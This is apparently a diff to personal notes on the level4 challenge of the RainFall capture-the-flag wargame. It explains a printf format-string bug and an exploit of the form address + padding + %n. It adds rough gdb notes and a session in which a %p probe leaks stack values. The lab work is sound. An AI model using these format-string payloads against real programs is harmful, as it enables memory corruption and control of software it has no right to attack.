@@ -1,5 +1,6 @@
 # Level4 Walkthrough
 
+
 ## Overview
 - `level4/source.c` reads up to `0x200` bytes from stdin into a local 520-byte buffer.
 - It then calls `printf(local_20c)` directly, so user input is treated as a format string.
@@ -47,3 +48,37 @@ level4@RainFall:~$ (cat /tmp/out; cat) | ./level4
 - Level3 required `m == 0x40`; level4 requires `m == 0x1025544`.
 - The exploit structure is the same: address + padding + `%n`.
   
+set disassembly-flavor intel
+
+info registers esp ebp
+x/16wx $esp
+x/s *(char **)($esp+4)
+-------------------------------------------------
+youtub video:
+
+the c decl : specifies how the function call another function
+
+func param: push from right to the left
+add(para1, param2)
+stack rep
+|
+| num1
+| num2
+||||||||||
+---------------------------Prove ------------------------
+(gdb) b n
+Breakpoint 1 at 0x8048460
+
+(gdb) run
+Starting program: /home/user/level4/level4 
+Breakpoint 1, 0x08048460 in n ()
+
+(gdb) next
+Single stepping until exit from function n,
+which has no line number information.
+
+AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p.%15$p
+AAAA.0xb7ff26b0.0xbffff764.0xb7fd0ff4.(nil).(nil).0xbffff728.0x804848d.0xbffff520.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2431252e.0x32252e70.0x252e7024
+0x080484b2 in main () 
+
+
